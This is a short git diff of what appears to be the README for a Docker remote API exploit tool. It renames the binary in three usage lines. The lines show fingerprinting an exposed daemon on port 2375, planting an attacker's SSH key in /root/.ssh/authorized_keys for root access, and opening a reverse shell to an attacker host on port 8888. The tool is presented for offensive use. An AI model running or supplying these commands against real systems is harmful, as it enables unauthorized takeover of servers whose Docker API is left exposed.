@@ -28,6 +28,6 @@ Usage of ./docker_remote_api_exp:
  (default "1.12")
  ```
 
-1. remote_api_exp -type=check -target=ip:2375，获取服务器信息，如操作系统，机器名，remote api版本以及docker的安装位置等
-1. ./remote_api_exp -type=root -target=ip:2375 -version=1.12.3，在/root/.ssh/authorized_keys写入攻击者的ssh公钥
-1. ./remote_api_exp -type=shell -target=ip:2375 -version=1.12.3 -reverse=attackerIp:8888，给攻击者反弹一个shell
+1. ./docker_remote_api_exp -type=check -target=ip:2375，获取服务器信息，如操作系统，机器名，remote api版本以及docker的安装位置等
+1. ./docker_remote_api_exp -type=root -target=ip:2375 -version=1.12.3，在/root/.ssh/authorized_keys写入攻击者的ssh公钥
+1. ./docker_remote_api_exp -type=shell -target=ip:2375 -version=1.12.3 -reverse=attackerIp:8888，给攻击者反弹一个shell
